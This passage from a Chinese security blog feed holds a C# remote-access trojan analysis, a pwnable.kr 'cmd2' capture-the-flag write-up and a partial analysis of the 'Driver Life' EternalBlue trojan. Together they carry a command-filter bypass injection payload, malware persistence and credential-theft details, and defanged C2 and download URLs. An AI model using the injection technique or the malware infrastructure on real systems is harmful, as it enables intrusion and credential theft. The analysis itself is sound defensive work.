<li>C#是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF%E5%85%AC%E5%8F%B8/732128">微软公司</a>发布的一种由C和C++衍生出来的面向对象的编程语言、运行于<a href="https://baike.baidu.com/item/.NET%20Framework">.NET Framework</a>和.NET Core(完全开源，跨平台)之上的高级程序设计语言。由于其相较于C/C++更为易于开发且同样强大，近年来越来越多的APT组织以及一些RAT工具都将C#做为主编程语言进行恶意样本的Downloader或者恶意样本本身来开发。</li>
<li>.NET/C#的反编译工具常见的有：.Net Reflector、ILSpy/dnSpy、JetBrains dotPeek、GrayWolf等。我常用的是ILSpy/dnSpy这两个工具，尤其dnSpy所具有的动态调试功能是分析样本的利器。</li>
<li>另外.Net/C#相关的逆向分析工具还有很多，比如解混淆的de4Dot，这些工具在吾爱的工具包中都已经集成了，需要可以去吾爱进行下载并使用。</li>
</ul>
<p>这里我将对一个典型的适合新手进行分析的C#远控样本进行分析，来对一些基础的C#分析技术点进行说明。</p>
<ul>
<li>样本信息如下：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">BFA95399E5F9413A0EC9289FAA1DC801</td>
</tr>
</tbody></table>
<ul>
<li>拿到样本后通过Exeinfo查看，样本是一个.net程序，使用dnspy进行分析</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/image-20200513183039006.png"></p>
<ul>
<li>样本执行流程大致如下：</li>
</ul>
<img src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/image-20200515184314506.png" style="zoom:80%;" />

<h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><h2 id="样本自身功能分析"><a href="#样本自身功能分析" class="headerlink" title="样本自身功能分析"></a>样本自身功能分析</h2><ul>
<li>将样本拖入DnSpy开始进行分析（Dnspy运行需要.Net Framework环境的支持，不能运行请下载并安装后再运行Dnspy），拖入后会显示下图所示一些信息包括文件名以及版本等静态信息。另外要注意的是exe文件拖入Dnspy后在侧边栏中名称为黄色，而dll文件拖入后在侧边栏中名称为白色。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101214706.png"></p>
<p>之后右键Go To Entry Point即可跳转到main函数，一般来说程序具有窗口(无论隐藏与否)时，main函数都是用来调用Application.Run()进行窗口的启动(学过SDK/MFS的同学应该不陌生，这就相当于启动了窗口的消息循环)：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101215321.png"></p>
<p>一般来说，恶意操作都会在隐藏窗口类中进行，我们只需向下寻找即可。向下分析后果然找到了内嵌ShellCode代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514101237484.png"></p>
<p>这里提一句，在Dnspy中也可以进行交叉引用的分析，只要选中函数名或变量名，然后右键Analyze即可打开对应窗口进行查看，很方便：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101220353.png"></p>
<ul>
<li>上述的shellcode在样本中是加密存储的，样本执行时会对其进行两次解密，这里就要用到Dnspy动态调试的功能来对解密后的shellcode进行dump，点击上方的start，默认以C#代码进行调试(另外还有IL和VB两种查看方式)，Dnspy调试快捷键和VS相同(F9、F10、F11)，我们在调试时，会自动显示出Locals窗口，里面对当前所在命令空间的变量进行实时显示。Dnspy中所有能显示的窗口都在Debug选项下。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20210101221551373.png"></p>
<p>运行到解密完成后，观察 rawAssembly的值：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101222121.png"></p>
<p>将其中数据拿出后，发现解密后的shellcode为一个PE格式的恶意代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/image-20200514100156590.png"></p>
<p>通过Locals中右键rawAssenbly进行save操作，将shellcdoe保存到本地，留待稍后分析。</p>
<ul>
<li>这里解密后的操作时利用C#反射的技术进行shellcode调用，可以判断dump到的shellcode为一个dll，接口为dll的Main函数，传入参数如下所示，同样通过调试运行观察内存得到：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514101412539.png"></p>
<h2 id="dump到的dll分析"><a href="#dump到的dll分析" class="headerlink" title="dump到的dll分析"></a>dump到的dll分析</h2><ul>
<li>查看dump到的恶意shellcode，确实是个dll文件，Dnspy分析其名称为CoreFunctions.dll(重要)，信息如下所示：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">501FEB03129FF392F6FFB5AEEC900356</td>
</tr>
<tr>
<td align="center">名称</td>
<td align="center">CoreFunctions.dll</td>
</tr>
</tbody></table>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514160735637.png"></p>
<ul>
<li>对于C#dll的分析，首先我们可以考虑自己写一个Loader然后将Loader.exe和dll一起拖入dnspy，然后进行dll调试。</li>
</ul>
<p>我用到了VS进行Loader的编写，这里有个要注意点是，在using dll时，用到的dll名称要和将dll拖入dnspy中反编译出的命名空间名称一致即为CoreFunctions，代码的编写很简单，只要将对应的Main函数调用并传入上述抓取到的参数即可：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">CoreFunctions.Class1.Main(<span class="string">&quot;02bc3.resources&quot;</span>, <span class="string">&quot;5de4f.png&quot;</span>, <span class="string">&quot;JV6tiESFB&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>切记：建议向我这样加上一个窗口和调用按钮，防止在编译exe时不小心加载了恶意dll。当然也可以不加，不过就需要时刻注意自己生成exe的方式为右键重新生成而不是直接Release。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101225528.png"></p>
<ul>
<li>另外分享一个快速调试方式，经过前辈们分析底层函数发现一个关键函数：InvokeMethodFast()，此函数在运行dll之后会被调用，步入断点所在的代码，就可以直接进入dll进行调试。ps:这个方法可以一直运行下去，省了dump的麻烦，可谓非常厉害了</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514174945600.png"></p>
<ul>
<li>此dll执行的操作流程大致如下，详细分析不在赘述：</li>
</ul>
<p><strong>获取样本完整路径-&gt;加载样本的资源(“02bc3.resources”)-&gt;遍历资源找到”5de4f.png”的数据-&gt;对数据进行处理并以”JV6tiESFB”作为Key来解密数据-&gt;得到新的恶意代码并执行</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514163656864.png"></p>
<p>资源如图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514165728086.png"></p>
<h2 id="新恶意代码分析"><a href="#新恶意代码分析" class="headerlink" title="新恶意代码分析"></a>新恶意代码分析</h2><ul>
<li>依旧将新的恶意代码dump然后分析，命名为ReZer0V2.exe信息如下：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">B9C0837EED92228BFD8C55E2D40630D6</td>
</tr>
<tr>
<td align="center">名称</td>
<td align="center">ReZer0V2.exe</td>
</tr>
</tbody></table>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514165433142.png"></p>
<p>分析调用后会发现，其会从EntryPonit入口点开始运行代码，样本是一个C#的exe，可以直接进行调试分析，调试方法和最初样本一样。</p>
<p>这份恶意代码又加入了新的东西，那就是C#程序防止反编译常用到的混淆操作。由于有混淆不能正常调试，所以调试之前先使用de4dot进行解混淆操作(大部分情况下不能解出正确的函数名，只是使得代码更加易读一点)。de4dot用法是将C#程序拖到de4dot.exe上执行即可(版本选择正确)，也可以cmd命令行执行，看你个人选择。</p>
<ul>
<li>此恶意程序完成了如下的操作:</li>
</ul>
<p>创建互斥体”FWYvRWJ”防多开、睡眠主线程</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514181658845.png"></p>
<p>查询指定文件：<code>&quot;C:\Users\Administrator\AppData\Roaming\wpohqL.exe&quot;</code>是否存在，不存在生成，完成对最开始样本的复制存储</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514182340233.png"></p>
<p>之后调用函数smethod_6进行操作：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514182428739.png"></p>
<p>主要完成了如下操作：</p>
<p>向路径”C:\Users\Administrator\AppData\Local\Temp&quot;下生成了一个临时命名的临时文件，将资源中的XML数据进行替换之后填充临时文件，如图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200514213020087.png"></p>
<p>之后构造一个进程启动信息，然后启动进程 schtasks.exe，输入命令为：/Create  /TN ”Updates\ wpohqL”  /XML  “C:\Users\Administrator\AppData\Local\Temp%.tmp”，创建一个计划任务，任务目的是在用户登录时启动程序：C:\Users\Administrator\AppData\Roaming\wpohqL.exe，完成对样本副本的持久化</p>
<p>最后程序流程执行到运行一个新的恶意程序</p>
<h2 id="熟悉的C-程序分析"><a href="#熟悉的C-程序分析" class="headerlink" title="熟悉的C++程序分析"></a>熟悉的C++程序分析</h2><ul>
<li>这次dump到的恶意程序，是一个熟悉的C++程序，信息如下：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">描述</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">eb5e1c063fab1a1a0f93ab615b72b461</td>
</tr>
</tbody></table>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515132504545.png"></p>
<p>这个恶意程序就是做恶意操作的主要程序，有以下恶意行为：</p>
<p>通过动态获取API地址来进行功能的实现，程序内置hash后的API名称字符串，通过函数sub.004031E5获取</p>
<p>利用SetErrorMode()来进行反沙箱操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515144232160.png"></p>
<p>调用advapi32.dll中的函数来计算出一个唯一hash，用于创建互斥体，图中一个为计算之前的，圈出来为计算之后的互斥体名称，检测多开</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515150755098.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515143401005.png"></p>
<ul>
<li>程序有几个关键的call，分别用于完成不同的功能：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90120210101233458.png"></p>
<p><strong>第一个call：</strong></p>
<p>获取注册表信息，修改FirFox配置进行流量劫持：</p>
<p>“SOFTWARE\Mozilla\Mozilla Firefox”拼接为完整信息“SOFTWARE\Mozilla\Mozilla Firefox\53.0 (x 86 zh-C)\Main”，并向path环境变量中添加新的路径：”C:\Program Files\Mozilla Firefox”</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515174646957.png"></p>
<p>检测nss3.dll是否存在，存在加载dll，动态获取API</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515174915441.png"></p>
<p>获取的API有：</p>
<p>NSS_Init、NSS_Shutdown、PK11_GetInternalKeySlot、PK11_FreeSlot、PK11_Authenticate、PK11SDR_Decrypt、PK11_CheckUserPassword、SECITEM_FreeItem</p>
<p>之后大范围去将“\AppData\Roaming\Mozilla\Firefox”+下图所示的路径拼接：(图示为一部分)</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515180302171.png"></p>
<p>然后利用nss.dll对Firefox配置进行一些列操作</p>
<p><strong>第二个call：</strong></p>
<p>释放隐藏的副本文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515154911880.png"></p>
<p>用于在本地”\ AppData\ Roaming\ “创建一个新目录，并向其中存放样本副本，同时为目录和副本都设置隐藏属性，路径如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515152420753.png"></p>
<p><strong>第三个call：</strong></p>
<p>构造Socket套接字，建立TCP远程通信，上传获取到的所有本机信息，等待后续远控</p>
<p>获取信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515172032119.png"></p>
<p>建立连接：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515172130345.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901image-20200515170114379.png"></p>
<p>C2信息如下：</p>
<p>URL：hxxp://broken6[.]cf/L8/fre.pnp</p>
<p>IP：104.27.145.219:80</p>
<h1 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h1><p><strong>Md5：</strong></p>
<p>BFA95399E5F9413A0EC9289FAA1DC801</p>
<p>501FEB03129FF392F6FFB5AEEC900356</p>
<p>B9C0837EED92228BFD8C55E2D40630D6</p>
<p>eb5e1c063fab1a1a0f93ab615b72b461</p>
<p><strong>URL：</strong></p>
<p>hxxp://broken6[.]cf/L8/fre.pnp</p>
<p><strong>Domain:</strong></p>
<p>broken6[.]cf</p>
<p><strong>IP:</strong></p>
<p>104.27.145.219:80</p>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>样本分析</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之15-cmd2</title>
    <url>/2021/09/24/pwnable/pwnable.kr%E7%B3%BB%E5%88%9715-cmd2/</url>
    <content><![CDATA[<p>另一道关于命令行的题目：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923124717.png"></p>
<p>​    ssh连上，密码为cmd1的flag内容，mommy now I get what PATH environment is for :)</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210923182420.png"></p>
<p>​    查看cmd2.c源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** p;</span><br><span class="line">    <span class="keyword">for</span>(p=environ; *p; p++)    <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">    delete_env();</span><br><span class="line">    putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    system( argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>​    和cmd1差不多的题目，这次过滤条件更加苛刻，按cmd1解题思路来想这道题，主要难点就在于”/“被屏蔽了，想办法输入一个”/“问题就可以轻松解决。</p>
<p>​    不知道哪位大佬发现的pwd在修改了PATH路径后依旧可以执行：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210924122335.png"></p>
<p>​    所以这里就简单了，我们进入<code>/</code>根目录，然后利用pwd输出的路径”/“来构造cat flag命令:</p>
<p>/home/cmd2/cmd2 ‘$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*’</p>
<p>​    即可成功得到flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210924122544.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>谈一谈驱动人生木马</title>
    <url>/2021/03/06/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E8%B0%88%E4%B8%80%E8%B0%88%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<p>​    本文是作者在奇安信威胁情报中心公众号发布的文章<a href="https://mp.weixin.qq.com/s/mMi5fHtBPuN09uH6FKm0_g">永恒的对手：永恒之蓝挖矿木马的前世今生</a>，这里在个人博客做个记录。</p>
<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><p>​    “驱动人生”劫持木马是在18年12月份爆发的一次攻击，木马团伙通过劫持驱动人生升级服务器下发该木马致使大量客户中招。此木马近年来一直处于活跃状态，攻击、传播手法持续更新。在进行客户侧应急时，我们经常会遇到该系列木马，由于该木马使用的攻击与传播手段基本覆盖了常见的各种方法，此木马在内网的流行程度反而在一定程度上反映了一个网络的安全性，甚至可以用来作为指标来评估内网的安全程度。</p>
<p>​    鉴于此种情况，我们认为有必要对“永恒之蓝木马下载器”(由于病毒发展，逐步脱离了最初得驱动人生模块，后文都用此称呼来描述)进行一个总结性的整理，本文从该木马功能演进角度出发，说明了各个时间点木马的特性并对木马中的各个模块进行了一个简单的分析。</p>
<h2 id="00-时间线梳理"><a href="#00-时间线梳理" class="headerlink" title="00 时间线梳理"></a>00 时间线梳理</h2><p>​    对“永恒之蓝木马下载器”系列木马更新时间线进行整理如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153054.png"></p>
<h1 id="2-最初的攻击方式"><a href="#2-最初的攻击方式" class="headerlink" title="2. 最初的攻击方式"></a>2. 最初的攻击方式</h1><p>​    2018年12月14日，“永恒之蓝木马下载器”攻击爆发，攻击者利用驱动人生团队外出团建的时机，开始了一次蓄谋已久的恶意活动。其利用前期已掌握到的信息，在14日下午劫持了驱动人生公司的升级服务器，修改了服务器中负责升级的配置文件ServiceConfig.xml，利用该配置文件中的存储的SQL数据库IP和密码登陆到SQL数据库并向其中插入了恶意下载链接：</p>
<p><code>hxxp://pull[.]update[.]ackng[.]com/ </code></p>
<p>​    从而实现劫持人生日历、USB宝盒、160压缩、160Wifi等软件的升级通道，进而可以进行恶意程序分发。</p>
<p>​    此次攻击是一次典型的供应链攻击事件，据监测从攻击爆发开始，仅仅两个小时中招用户就达到了10万的高峰，其恶意代码具体的分发流程如图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153454.png"></p>
<p>​    此时下载到的恶意木马主要被用于释放挖矿与远控的加载器、下载内网横向传播模块等，横向传播使用了经典的“永恒之蓝”漏洞。最初Payload的下载地址为：</p>
<p><code>hxxp://dl[.]haqo[.]net/</code></p>
<p>​    目前已知从该地址下载到的文件名为：dl.exe、dll.exe、eb.exez、updater等。</p>
<p>​    对于中招的机器，则会执行bat命令尝试进行横向移动 。</p>
<p>​    最初的攻击链中，更新程序DTLUpg.exe从如下形式的C2下载第一阶段Payload：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">hxxp://pull[.]update[.]ackng[.]com/ziptool/PullExecute/F79CB9D2893B254CC75DFB7F3E454A69.exe    hxxp://pull[.]update[.]ackng[.]com/160wifibroad/pullexecute/f79cb9d2893b254cc75dfb7f3e454a69.exe</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>

<p>​    劫持后不同URL仅仅对应驱动人生系列的不同产品，最终均为同一个恶意程序。该阶段恶意程序执行流程如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153629.png"></p>
<h2 id="00-木马主体分析"><a href="#00-木马主体分析" class="headerlink" title="00 木马主体分析"></a>00 木马主体分析</h2><p>​    病毒文件f79cb9d2893b254cc75dfb7f3e454a69.exe一般被下载释放在C:\Program File\DTLSoft\Updater\ctrlf路径下，主要行为如下：</p>
<ol>
<li>将自身拷贝到System32(SysWOW64)下，命名为svhost.exe(即C:\Windows\System32\svhost.exe)，并安装为服务，服务名为”Ddriver”：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153750.png"></p>
<p>​    启动服务：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153805.png"></p>
<ol start="2">
<li><p>作为服务运行后，进入注册函数执行，主要完成了对于远控模块svhhost.exe的释放和拉取，以及对于攻击模块svvhost.exe的下载和执行，具体细节如下：</p>
<ul>
<li>创建互斥体”it is holy shit”，检测是否重复启动服务进行感染：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153915.png"></p>
<ul>
<li>将资源中的”zip”下的PE文件释放为System32(SysWOW64)下的svhhost.exe，即远控模块：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153944.png"></p>
<p>​    svhost.exe的资源如下所示,PE信息被明文存储：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154008.png"></p>
<ul>
<li>在svhhost.exe中创建互斥体防止多开：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154109.png"></p>
<p>​    同时会循环检测任务管理器以及一系列游戏进程，若有在执行的，则将svhhost.exe退出，以更好的隐藏自身：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154120.png"></p>
<ul>
<li><p>获取当前计算机信息，包括计算机名称、GUID、用户名、系统产品号、系统版本、系统平台、显卡信息、杀软信息等。将上述所有信息上传到</p>
<p><code>hxxp://i[.]haqo.net/i.png</code></p>
<p>或</p>
<p><code>hxxp://p[.]abbny.com/im.png</code></p>
<p>等待C2返回控制信息并执行：</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154212.png"></p>
<ul>
<li>通过共享内存和远控模块svhhost.exe交互，将下载到的ShellCode通过该共享内存传递给svhhost.exe执行，一般用来执行挖矿代码：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154234.png"></p>
<ul>
<li><p>下载svvhost.exe永恒之蓝攻击模块到本地并执行，下载URL为 ：</p>
<p><code>hxxp://dl[.]haqo[.]net/eb.exez</code></p>
<p>若返回的数据有“.exez”后缀信息则下载文件：</p>
</li>
</ul>
